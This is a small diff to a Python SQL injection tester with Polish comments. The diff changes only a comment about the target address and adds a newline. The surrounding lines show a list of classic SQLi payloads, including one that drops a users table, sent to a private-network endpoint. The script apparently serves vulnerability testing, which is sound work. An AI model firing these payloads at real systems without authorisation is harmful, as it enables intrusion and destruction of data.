@@ -13,7 +13,7 @@ Autor:
 - Mateusz
 """
 import requests
-# Adres testowanego endpointa
+# Adres testowanego endpointa, musisz go zmienic na swoj
 url = "http://192.168.1.197:8080"
 # Lista klasycznych payloadów SQLi
 payloads = ["'", "' OR '1'='1", "\" OR \"1\"=\"1", "'; DROP TABLE users; --"]
@@ -28,3 +28,4 @@ for payload in payloads:
         vulnerable = True
 if not vulnerable:
     print("[-] Nie wykryto podatności SQL Injection.")
+
